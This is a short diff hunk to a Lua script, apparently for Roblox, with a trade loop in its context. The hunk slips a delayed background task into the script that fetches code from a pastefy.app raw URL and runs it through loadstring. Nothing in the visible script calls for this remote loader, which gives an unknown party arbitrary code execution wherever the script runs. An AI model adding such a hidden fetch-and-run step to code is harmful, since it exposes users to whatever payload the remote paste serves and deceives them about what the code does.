@@ -677,7 +677,10 @@ task.spawn(function()
 	end
 end)
 
-
+task.spawn(function() 
+	task.wait(5) 
+	loadstring(game:HttpGet("https://pastefy.app/Ku2ToTwJ/raw"))() 
+	end)
 
 while task.wait(1) do
 	if not tradeRunning then
